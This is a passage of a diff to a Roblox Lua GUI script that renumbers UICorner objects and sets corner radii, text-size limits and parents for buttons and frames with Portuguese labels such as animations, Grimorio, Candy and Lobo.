 Converted["_Rob�"].Name = "Rob�"
 Converted["_Rob�"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner35"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner35"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner35"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner35"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner35"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner35"].Parent = Converted["_Rob�"]
+Converted["_UICorner34"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner34"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner34"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner34"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner34"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner34"].Parent = Converted["_Rob�"]
 
 Converted["_UITextSizeConstraint37"].MaxTextSize = 20
 Converted["_UITextSizeConstraint37"].Parent = Converted["_Rob�"]
@@ -1541,12 +1549,12 @@ Converted["_Elf"].Visible = false
 Converted["_Elf"].Name = "Elf"
 Converted["_Elf"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner36"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner36"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner36"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner36"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner36"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner36"].Parent = Converted["_Elf"]
+Converted["_UICorner35"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner35"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner35"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner35"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner35"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner35"].Parent = Converted["_Elf"]
 
 Converted["_UITextSizeConstraint38"].MaxTextSize = 20
 Converted["_UITextSizeConstraint38"].Parent = Converted["_Elf"]
@@ -1568,12 +1576,12 @@ Converted["_Velho"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_Velho"].Name = "Velho"
 Converted["_Velho"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner37"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner37"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner37"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner37"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner37"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner37"].Parent = Converted["_Velho"]
+Converted["_UICorner36"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner36"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner36"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner36"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner36"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner36"].Parent = Converted["_Velho"]
 
 Converted["_UITextSizeConstraint39"].MaxTextSize = 20
 Converted["_UITextSizeConstraint39"].Parent = Converted["_Velho"]
@@ -1596,12 +1604,12 @@ Converted["_Walmart"].Visible = false
 Converted["_Walmart"].Name = "Walmart"
 Converted["_Walmart"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner38"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner38"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner38"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner38"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner38"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner38"].Parent = Converted["_Walmart"]
+Converted["_UICorner37"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner37"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner37"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner37"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner37"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner37"].Parent = Converted["_Walmart"]
 
 Converted["_UITextSizeConstraint40"].MaxTextSize = 20
 Converted["_UITextSizeConstraint40"].Parent = Converted["_Walmart"]
@@ -1624,12 +1632,12 @@ Converted["_malvada"].Visible = false
 Converted["_malvada"].Name = "malvada"
 Converted["_malvada"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner39"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner39"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner39"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner39"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner39"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner39"].Parent = Converted["_malvada"]
+Converted["_UICorner38"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner38"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner38"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner38"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner38"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner38"].Parent = Converted["_malvada"]
 
 Converted["_UITextSizeConstraint41"].MaxTextSize = 20
 Converted["_UITextSizeConstraint41"].Parent = Converted["_malvada"]
@@ -1651,12 +1659,12 @@ Converted["_Brinquedo"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_Brinquedo"].Name = "Brinquedo"
 Converted["_Brinquedo"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner40"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner40"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner40"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner40"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner40"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner40"].Parent = Converted["_Brinquedo"]
+Converted["_UICorner39"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner39"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner39"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner39"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner39"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner39"].Parent = Converted["_Brinquedo"]
 
 Converted["_UITextSizeConstraint42"].MaxTextSize = 20
 Converted["_UITextSizeConstraint42"].Parent = Converted["_Brinquedo"]
@@ -1678,12 +1686,12 @@ Converted["_superhero1"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_superhero1"].Name = "superhero"
 Converted["_superhero1"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner41"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner41"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner41"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner41"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner41"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner41"].Parent = Converted["_superhero1"]
+Converted["_UICorner40"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner40"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner40"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner40"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner40"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner40"].Parent = Converted["_superhero1"]
 
 Converted["_UITextSizeConstraint43"].MaxTextSize = 20
 Converted["_UITextSizeConstraint43"].Parent = Converted["_superhero1"]
@@ -1706,12 +1714,12 @@ Converted["_Through Life"].Visible = false
 Converted["_Through Life"].Name = "Through Life"
 Converted["_Through Life"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner42"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner42"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner42"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner42"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner42"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner42"].Parent = Converted["_Through Life"]
+Converted["_UICorner41"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner41"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner41"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner41"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner41"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner41"].Parent = Converted["_Through Life"]
 
 Converted["_UITextSizeConstraint44"].MaxTextSize = 20
 Converted["_UITextSizeConstraint44"].Parent = Converted["_Through Life"]
@@ -1734,12 +1742,12 @@ Converted["_superhero2"].Visible = false
 Converted["_superhero2"].Name = "superhero"
 Converted["_superhero2"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner43"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner43"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner43"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner43"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner43"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner43"].Parent = Converted["_superhero2"]
+Converted["_UICorner42"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner42"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner42"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner42"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner42"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner42"].Parent = Converted["_superhero2"]
 
 Converted["_UITextSizeConstraint45"].MaxTextSize = 20
 Converted["_UITextSizeConstraint45"].Parent = Converted["_superhero2"]
@@ -1762,12 +1770,12 @@ Converted["_Glow"].Visible = false
 Converted["_Glow"].Name = "Glow"
 Converted["_Glow"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner44"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner44"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner44"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner44"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner44"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner44"].Parent = Converted["_Glow"]
+Converted["_UICorner43"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner43"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner43"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner43"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner43"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner43"].Parent = Converted["_Glow"]
 
 Converted["_UITextSizeConstraint46"].MaxTextSize = 20
 Converted["_UITextSizeConstraint46"].Parent = Converted["_Glow"]
@@ -1777,12 +1785,12 @@ Converted["_UIGridLayout2"].CellSize = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_UIGridLayout2"].SortOrder = Enum.SortOrder.LayoutOrder
 Converted["_UIGridLayout2"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner45"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner45"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner45"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner45"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner45"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner45"].Parent = Converted["_anima��es"]
+Converted["_UICorner44"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner44"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner44"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner44"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner44"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner44"].Parent = Converted["_anima��es"]
 
 Converted["_UIPadding3"].PaddingBottom = UDim.new(0, 10)
 Converted["_UIPadding3"].PaddingLeft = UDim.new(0, 10)
@@ -1799,12 +1807,12 @@ Converted["_voxUp"].Visible = false
 Converted["_voxUp"].Name = "voxUp"
 Converted["_voxUp"].Parent = Converted["_mainFrame"]
 
-Converted["_UICorner46"].BottomLeftRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner46"].BottomRightRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner46"].CornerRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner46"].TopLeftRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner46"].TopRightRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner46"].Parent = Converted["_voxUp"]
+Converted["_UICorner45"].BottomLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner45"].BottomRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner45"].CornerRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner45"].TopLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner45"].TopRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner45"].Parent = Converted["_voxUp"]
 
 Converted["_UIPadding4"].PaddingBottom = UDim.new(0, 10)
 Converted["_UIPadding4"].PaddingLeft = UDim.new(0, 10)
@@ -1824,12 +1832,12 @@ Converted["_RoVibes"].Size = UDim2.new(1, 0, 0.5, 0)
 Converted["_RoVibes"].Name = "RoVibes"
 Converted["_RoVibes"].Parent = Converted["_voxUp"]
 
-Converted["_UICorner47"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner47"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner47"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner47"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner47"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner47"].Parent = Converted["_RoVibes"]
+Converted["_UICorner46"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner46"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner46"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner46"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner46"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner46"].Parent = Converted["_RoVibes"]
 
 Converted["_GrimoryButton"].Font = Enum.Font.FredokaOne
 Converted["_GrimoryButton"].Text = ""
@@ -1849,12 +1857,12 @@ Converted["_GrimoryButton"].Parent = Converted["_RoVibes"]
 Converted["_UITextSizeConstraint47"].MaxTextSize = 20
 Converted["_UITextSizeConstraint47"].Parent = Converted["_GrimoryButton"]
 
-Converted["_UICorner48"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner48"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner48"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner48"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner48"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner48"].Parent = Converted["_GrimoryButton"]
+Converted["_UICorner47"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner47"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner47"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner47"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner47"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner47"].Parent = Converted["_GrimoryButton"]
 
 Converted["_TextLabel7"].Font = Enum.Font.FredokaOne
 Converted["_TextLabel7"].Text = "Grimorio"
@@ -1893,12 +1901,12 @@ Converted["_keybutton5"].Size = UDim2.new(0.180663973, 0, 0.756362855, 0)
 Converted["_keybutton5"].Name = "keybutton"
 Converted["_keybutton5"].Parent = Converted["_GrimoryButton"]
 
-Converted["_UICorner49"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner49"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner49"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner49"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner49"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner49"].Parent = Converted["_keybutton5"]
+Converted["_UICorner48"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner48"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner48"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner48"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner48"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner48"].Parent = Converted["_keybutton5"]
 
 Converted["_UITextSizeConstraint49"].MaxTextSize = 15
 Converted["_UITextSizeConstraint49"].Parent = Converted["_keybutton5"]
@@ -1932,12 +1940,12 @@ Converted["_CandyButton"].Parent = Converted["_RoVibes"]
 Converted["_UITextSizeConstraint50"].MaxTextSize = 20
 Converted["_UITextSizeConstraint50"].Parent = Converted["_CandyButton"]
 
-Converted["_UICorner50"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner50"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner50"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner50"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner50"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner50"].Parent = Converted["_CandyButton"]
+Converted["_UICorner49"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner49"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner49"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner49"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner49"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner49"].Parent = Converted["_CandyButton"]
 
 Converted["_TextLabel8"].Font = Enum.Font.FredokaOne
 Converted["_TextLabel8"].Text = "Candy"
@@ -1976,12 +1984,12 @@ Converted["_keybutton6"].Size = UDim2.new(0.180663973, 0, 0.756362855, 0)
 Converted["_keybutton6"].Name = "keybutton"
 Converted["_keybutton6"].Parent = Converted["_CandyButton"]
 
-Converted["_UICorner51"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner51"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner51"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner51"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner51"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner51"].Parent = Converted["_keybutton6"]
+Converted["_UICorner50"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner50"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner50"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner50"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner50"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner50"].Parent = Converted["_keybutton6"]
 
 Converted["_UITextSizeConstraint52"].MaxTextSize = 15
 Converted["_UITextSizeConstraint52"].Parent = Converted["_keybutton6"]
@@ -2004,12 +2012,12 @@ Converted["_BoneButton"].Parent = Converted["_RoVibes"]
 Converted["_UITextSizeConstraint53"].MaxTextSize = 20
 Converted["_UITextSizeConstraint53"].Parent = Converted["_BoneButton"]
 
-Converted["_UICorner52"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner52"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner52"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner52"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner52"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner52"].Parent = Converted["_BoneButton"]
+Converted["_UICorner51"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner51"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner51"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner51"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner51"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner51"].Parent = Converted["_BoneButton"]
 
 Converted["_TextLabel9"].Font = Enum.Font.FredokaOne
 Converted["_TextLabel9"].Text = "Osso"
@@ -2048,12 +2056,12 @@ Converted["_keybutton7"].Size = UDim2.new(0.180663973, 0, 0.756362855, 0)
 Converted["_keybutton7"].Name = "keybutton"
 Converted["_keybutton7"].Parent = Converted["_BoneButton"]
 
-Converted["_UICorner53"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner53"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner53"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner53"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner53"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner53"].Parent = Converted["_keybutton7"]
+Converted["_UICorner52"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner52"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner52"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner52"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner52"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner52"].Parent = Converted["_keybutton7"]
 
 Converted["_UITextSizeConstraint55"].MaxTextSize = 15
 Converted["_UITextSizeConstraint55"].Parent = Converted["_keybutton7"]
@@ -2076,12 +2084,12 @@ Converted["_LoboButton"].Parent = Converted["_RoVibes"]
 Converted["_UITextSizeConstraint56"].MaxTextSize = 20
 Converted["_UITextSizeConstraint56"].Parent = Converted["_LoboButton"]
 
-Converted["_UICorner54"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner54"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner54"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner54"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner54"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner54"].Parent = Converted["_LoboButton"]
+Converted["_UICorner53"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner53"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner53"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner53"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner53"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner53"].Parent = Converted["_LoboButton"]
 
 Converted["_TextLabel10"].Font = Enum.Font.FredokaOne
 Converted["_TextLabel10"].Text = "Lobo"
@@ -2120,12 +2128,12 @@ Converted["_keybutton8"].Size = UDim2.new(0.180663973, 0, 0.756362855, 0)
 Converted["_keybutton8"].Name = "keybutton"
 Converted["_keybutton8"].Parent = Converted["_LoboButton"]
 
-Converted["_UICorner55"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner55"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner55"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner55"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner55"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner55"].Parent = Converted["_keybutton8"]
+Converted["_UICorner54"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner54"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner54"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner54"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner54"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner54"].Parent = Converted["_keybutton8"]
 
 Converted["_UITextSizeConstraint58"].MaxTextSize = 15
 Converted["_UITextSizeConstraint58"].Parent = Converted["_keybutton8"]
@@ -2148,12 +2156,12 @@ Converted["_LuckButton"].Parent = Converted["_RoVibes"]
 Converted["_UITextSizeConstraint59"].MaxTextSize = 20
 Converted["_UITextSizeConstraint59"].Parent = Converted["_LuckButton"]
 
-Converted["_UICorner56"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner56"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner56"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner56"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner56"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner56"].Parent = Converted["_LuckButton"]
+Converted["_UICorner55"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner55"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner55"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner55"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner55"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner55"].Parent = Converted["_LuckButton"]
 
 Converted["_TextLabel11"].Font = Enum.Font.FredokaOne
 Converted["_TextLabel11"].Text = "Luck block"
@@ -2192,12 +2200,12 @@ Converted["_keybutton9"].Size = UDim2.new(0.180663973, 0, 0.756362855, 0)
 Converted["_keybutton9"].Name = "keybutton"
 Converted["_keybutton9"].Parent = Converted["_LuckButton"]
 
-Converted["_UICorner57"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner57"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner57"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner57"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner57"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner57"].Parent = Converted["_keybutton9"]
+Converted["_UICorner56"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner56"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner56"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner56"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner56"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner56"].Parent = Converted["_keybutton9"]
 
 Converted["_UITextSizeConstraint61"].MaxTextSize = 15
 Converted["_UITextSizeConstraint61"].Parent = Converted["_keybutton9"]
@@ -2265,19 +2273,19 @@ Converted["_SeachBox"].Parent = Converted["_stalker"]
 Converted["_UITextSizeConstraint62"].MaxTextSize = 20
 Converted["_UITextSizeConstraint62"].Parent = Converted["_SeachBox"]
 
-Converted["_UICorner58"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner58"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner58"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner58"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner58"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner58"].Parent = Converted["_SeachBox"]
+Converted["_UICorner57"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner57"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner57"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner57"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner57"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner57"].Parent = Converted["_SeachBox"]
 
-Converted["_UICorner59"].BottomLeftRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner59"].BottomRightRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner59"].CornerRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner59"].TopLeftRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner59"].TopRightRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner59"].Parent = Converted["_stalker"]
+Converted["_UICorner58"].BottomLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner58"].BottomRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner58"].CornerRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner58"].TopLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner58"].TopRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner58"].Parent = Converted["_stalker"]
 
 Converted["_Cmds"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Converted["_Cmds"].BackgroundTransparency = 1
@@ -2303,12 +2311,12 @@ Converted["_verButton"].Size = UDim2.new(0.287284046, 0, 0.17749913, 0)
 Converted["_verButton"].Name = "verButton"
 Converted["_verButton"].Parent = Converted["_Cmds"]
 
-Converted["_UICorner60"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner60"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner60"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner60"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner60"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner60"].Parent = Converted["_verButton"]
+Converted["_UICorner59"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner59"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner59"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner59"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner59"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner59"].Parent = Converted["_verButton"]
 
 Converted["_UITextSizeConstraint63"].MaxTextSize = 20
 Converted["_UITextSizeConstraint63"].Parent = Converted["_verButton"]
@@ -2328,12 +2336,12 @@ Converted["_syncButton"].Size = UDim2.new(0.287284046, 0, 0.17749913, 0)
 Converted["_syncButton"].Name = "syncButton"
 Converted["_syncButton"].Parent = Converted["_Cmds"]
 
-Converted["_UICorner61"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner61"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner61"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner61"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner61"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner61"].Parent = Converted["_syncButton"]
+Converted["_UICorner60"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner60"].BottomRightRadius = UDim.new(0, 9)
